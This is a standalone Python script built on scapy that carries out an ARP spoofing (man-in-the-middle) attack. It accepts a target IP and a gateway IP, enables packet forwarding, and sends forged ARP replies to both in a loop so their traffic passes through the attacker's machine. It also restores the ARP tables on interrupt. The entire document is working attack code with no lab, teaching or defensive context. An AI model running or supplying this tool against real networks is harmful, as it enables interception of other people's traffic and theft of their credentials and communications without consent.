#!/bin/python3


# Import of libraries
import scapy.all as scapy
import time
import argparse
import subprocess


# Gets program arguments, IP addresses of the target and the gateway
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='Ip address of the target computer')
    parser.add_argument('-g', '--gateway', dest='gateway', help='IP address of the gateway')
    options = parser.parse_args()
    if not options.target:
        parser.error('\n[-] Please specify an IP address of the target machine, use --help for more info.')
    elif not options.gateway:
        parser.error('[-] Please specify an IP address of the gateway, use --help for more info.')
    return options


# Gets hosts MAC address
def get_mac(ip):
    # Create arp request directed to broadcast MAC asking for IPs
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')

    # Send packet and receive response
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# IP address spoofing
def spoof(spoof_target_ip, spoof_gateway_ip):
    spoof_target_mac = get_mac(spoof_target_ip)
    packet = scapy.ARP(op=2, pdst=spoof_target_ip, hwdst=spoof_target_mac, psrc=spoof_gateway_ip)
    scapy.send(packet, verbose=False)


# Restore default settings
def restore(restore_target_ip, restore_gateway_ip):
    restore_target_mac = get_mac(restore_target_ip)
    restore_gateway_mac = get_mac(restore_gateway_ip)
    packet = scapy.ARP(op=2, pdst=restore_target_ip, hwdst=restore_target_mac, psrc=restore_gateway_ip, hwsrc=restore_gateway_mac)
    scapy.send(packet, verbose=False, count=4)


# Set IPs of the target and the gateway
options = get_arguments()
target = options.target
gateway = options.gateway


# Enable packet forwarding
print('[+] Packet forwarding enabled')
subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)


# Spoofing itself
sent_packets_count = 0
try:
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        sent_packets_count = sent_packets_count + 2
        print('\r[+] Packets sent: ' + str(sent_packets_count), end=" ")
        time.sleep(2)


except IndexError:
    print('[-] Target host unavailable')
    print('[+] Packet forwarding disabled')
    subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
    print('[+] Aborting session...')


# User abort
except KeyboardInterrupt:
    print('\n[+] User abort detected')
    print('[+] Packet forwarding disabled')
    subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
    print('[+] Aborting session...')
    restore(target, gateway)
    restore(gateway, target)


